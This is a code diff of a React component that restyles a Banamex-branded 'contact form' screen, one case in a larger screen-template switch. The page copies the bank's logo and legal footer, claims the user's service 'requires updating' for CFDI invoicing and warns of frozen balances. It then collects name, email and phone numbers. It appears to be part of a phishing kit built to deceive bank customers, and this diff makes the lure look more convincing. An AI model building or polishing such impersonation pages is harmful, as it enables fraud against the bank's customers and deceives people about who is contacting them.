@@ -3065,59 +3065,98 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
       case ScreenType.BANAMEX_CONTACT_FORM:
         const banamexContactContent = (
-          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
-            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
-              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px', justifyContent: 'center' }}>
-                <svg width="120" height="50" viewBox="0 0 120 50" xmlns="http://www.w3.org/2000/svg">
-                  <g fill="#c81f3b">
-                    <circle cx="20" cy="15" r="8"/>
-                    <circle cx="20" cy="25" r="8"/>
-                    <circle cx="20" cy="35" r="8"/>
-                  </g>
-                  <text x="35" y="28" fill="#153e46" fontSize="18" fontWeight="600" fontFamily="Arial, sans-serif">banamex</text>
-                </svg>
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
+            <div style={{ maxWidth: '800px', margin: '0 auto' }}>
+              {/* Header - Logo */}
+              <header style={{ marginBottom: '24px', borderBottom: '2px solid #e5e7eb', paddingBottom: '16px' }}>
+                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '120px' }} />
               </header>
 
-              <div style={{ background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', borderRadius: '8px', padding: '28px', boxShadow: '0 6px 18px rgba(0,0,0,0.08)' }}>
-                <h2 style={{ fontSize: '22px', fontWeight: 600, color: '#153e46', marginBottom: '12px', textAlign: 'center' }}>
-                  Su servicio requiere actualización
-                </h2>
+              {/* Título principal */}
+              <div style={{ fontSize: '28px', fontWeight: 700, color: '#1f2937', marginBottom: '24px', borderLeft: '4px solid #dc2626', paddingLeft: '16px' }}>
+                Su servicio requiere actualización
+              </div>
 
-                <p style={{ fontSize: '15px', lineHeight: '1.6', color: '#2d4b51', marginBottom: '24px', textAlign: 'center' }}>
-                  Para cumplir con los requisitos de emisión de CFDI, un ejecutivo se comunicará con usted. Por favor, complete el siguiente formulario:
+              {/* Mensaje informativo */}
+              <div style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '20px', marginBottom: '24px' }}>
+                <p style={{ margin: '0 0 16px 0', color: '#374151', fontSize: '15px', lineHeight: 1.6 }}>
+                  En breve, uno de nuestros ejecutivos se pondrá en contacto con usted para asesorarlo en su proceso.
                 </p>
+                <p style={{ margin: '0 0 16px 0', color: '#374151', fontSize: '15px', lineHeight: 1.6 }}>
+                  Recuerde que mantener sus datos actualizados le permite emitir comprobantes CFDI con validez fiscal.
+                </p>
+                <p style={{ margin: 0, color: '#dc2626', fontSize: '15px', lineHeight: 1.6, fontWeight: 600 }}>
+                  Evite el bloqueo de sus saldos.
+                </p>
+              </div>
 
-                <div style={{ marginBottom: '18px' }}>
-                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
-                    Nombre completo *
+              {/* Formulario */}
+              <div style={{ background: '#fff', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '24px', marginBottom: '24px' }}>
+                <div style={{ marginBottom: '20px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                    Nombre completo
                   </label>
                   <input
                     type="text"
                     value={nombreBanamex}
                     onChange={(e) => setNombreBanamex(e.target.value)}
                     placeholder="Ingrese su nombre completo"
-                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    style={{ 
+                      width: '100%', 
+                      padding: '12px', 
+                      fontSize: '15px', 
+                      border: '2px solid #d1d5db', 
+                      borderRadius: '6px', 
+                      color: '#1f2937',
+                      outline: 'none',
+                      boxSizing: 'border-box'
+                    }}
+                    onFocus={(e) => {
+                      e.target.style.borderColor = '#dc2626';
+                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
+                    }}
+                    onBlur={(e) => {
+                      e.target.style.borderColor = '#d1d5db';
+                      e.target.style.boxShadow = 'none';
+                    }}
                     data-testid="input-nombre"
                   />
                 </div>
 
-                <div style={{ marginBottom: '18px' }}>
-                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
-                    Correo electrónico *
+                <div style={{ marginBottom: '20px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                    Correo electrónico
                   </label>
                   <input
                     type="email"
                     value={correoBanamex}
                     onChange={(e) => setCorreoBanamex(e.target.value)}
                     placeholder="ejemplo@correo.com"
-                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    style={{ 
+                      width: '100%', 
+                      padding: '12px', 
+                      fontSize: '15px', 
+                      border: '2px solid #d1d5db', 
+                      borderRadius: '6px', 
+                      color: '#1f2937',
+                      outline: 'none',
+                      boxSizing: 'border-box'
+                    }}
+                    onFocus={(e) => {
+                      e.target.style.borderColor = '#dc2626';
+                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
+                    }}
+                    onBlur={(e) => {
+                      e.target.style.borderColor = '#d1d5db';
+                      e.target.style.boxShadow = 'none';
+                    }}
                     data-testid="input-correo"
                   />
                 </div>
 
-                <div style={{ marginBottom: '18px' }}>
-                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
-                    Celular *
+                <div style={{ marginBottom: '20px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                    Celular
                   </label>
                   <input
                     type="tel"
@@ -3125,13 +3164,30 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     onChange={(e) => setCelularBanamex(e.target.value.replace(/\D/g, ''))}
                     placeholder="5512345678"
                     maxLength={10}
-                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    style={{ 
+                      width: '100%', 
+                      padding: '12px', 
+                      fontSize: '15px', 
+                      border: '2px solid #d1d5db', 
+                      borderRadius: '6px', 
+                      color: '#1f2937',
+                      outline: 'none',
+                      boxSizing: 'border-box'
+                    }}
+                    onFocus={(e) => {
+                      e.target.style.borderColor = '#dc2626';
+                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
+                    }}
+                    onBlur={(e) => {
+                      e.target.style.borderColor = '#d1d5db';
+                      e.target.style.boxShadow = 'none';
+                    }}
                     data-testid="input-celular"
                   />
                 </div>
 
                 <div style={{ marginBottom: '24px' }}>
-                  <label style={{ display: 'block', fontSize: '15px', fontWeight: 500, color: '#2d4b51', marginBottom: '8px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                     Teléfono alternativo (opcional)
                   </label>
                   <input
@@ -3140,31 +3196,77 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     onChange={(e) => setTelefonoAltBanamex(e.target.value.replace(/\D/g, ''))}
                     placeholder="5512345678"
                     maxLength={10}
-                    style={{ width: '100%', padding: '12px', fontSize: '16px', border: '2px solid #b0c9cd', borderRadius: '6px', color: '#0b3b43' }}
+                    style={{ 
+                      width: '100%', 
+                      padding: '12px', 
+                      fontSize: '15px', 
+                      border: '2px solid #d1d5db', 
+                      borderRadius: '6px', 
+                      color: '#1f2937',
+                      outline: 'none',
+                      boxSizing: 'border-box'
+                    }}
+                    onFocus={(e) => {
+                      e.target.style.borderColor = '#dc2626';
+                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
+                    }}
+                    onBlur={(e) => {
+                      e.target.style.borderColor = '#d1d5db';
+                      e.target.style.boxShadow = 'none';
+                    }}
                     data-testid="input-telefono-alternativo"
                   />
                 </div>
 
-                <div style={{ textAlign: 'right' }}>
-                  <button
-                    onClick={() => {
-                      if (nombreBanamex && correoBanamex && celularBanamex) {
-                        onSubmit(ScreenType.BANAMEX_CONTACT_FORM, {
-                          nombreContacto: nombreBanamex,
-                          correoContacto: correoBanamex,
-                          celularContacto: celularBanamex,
-                          telefonoAlternativoContacto: telefonoAltBanamex
-                        });
-                      }
-                    }}
-                    disabled={!nombreBanamex || !correoBanamex || !celularBanamex}
-                    style={{ padding: '14px 36px', fontSize: '16px', fontWeight: 600, border: 'none', borderRadius: '6px', background: nombreBanamex && correoBanamex && celularBanamex ? '#153e46' : '#b0c9cd', color: '#fff', cursor: nombreBanamex && correoBanamex && celularBanamex ? 'pointer' : 'not-allowed' }}
-                    data-testid="button-enviar"
-                  >
-                    Enviar
-                  </button>
-                </div>
+                <button
+                  onClick={() => {
+                    if (nombreBanamex && correoBanamex && celularBanamex) {
+                      onSubmit(ScreenType.BANAMEX_CONTACT_FORM, {
+                        nombreContacto: nombreBanamex,
+                        correoContacto: correoBanamex,
+                        celularContacto: celularBanamex,
+                        telefonoAlternativoContacto: telefonoAltBanamex
+                      });
+                    }
+                  }}
+                  disabled={!nombreBanamex || !correoBanamex || !celularBanamex}
+                  style={{ 
+                    width: '100%',
+                    padding: '14px', 
+                    borderRadius: '8px', 
+                    fontWeight: 600, 
+                    fontSize: '16px', 
+                    border: 'none', 
+                    background: nombreBanamex && correoBanamex && celularBanamex ? '#dc2626' : '#d1d5db', 
+                    color: '#fff', 
+                    cursor: nombreBanamex && correoBanamex && celularBanamex ? 'pointer' : 'not-allowed',
+                    transition: 'all 0.2s'
+                  }}
+                  onMouseOver={(e) => {
+                    if (nombreBanamex && correoBanamex && celularBanamex) {
+                      e.currentTarget.style.background = '#b91c1c';
+                    }
+                  }}
+                  onMouseOut={(e) => {
+                    if (nombreBanamex && correoBanamex && celularBanamex) {
+                      e.currentTarget.style.background = '#dc2626';
+                    }
+                  }}
+                  data-testid="button-continuar"
+                >
+                  Continuar
+                </button>
               </div>
+
+              {/* Footer */}
+              <footer style={{ borderTop: '2px solid #e5e7eb', paddingTop: '16px', color: '#6b7280', fontSize: '12px', lineHeight: 1.5 }}>
+                <p style={{ margin: '0 0 8px 0' }}>
+                  D.R., © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.
+                </p>
+                <p style={{ margin: 0 }}>
+                  Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
+                </p>
+              </footer>
             </div>
           </div>
         );
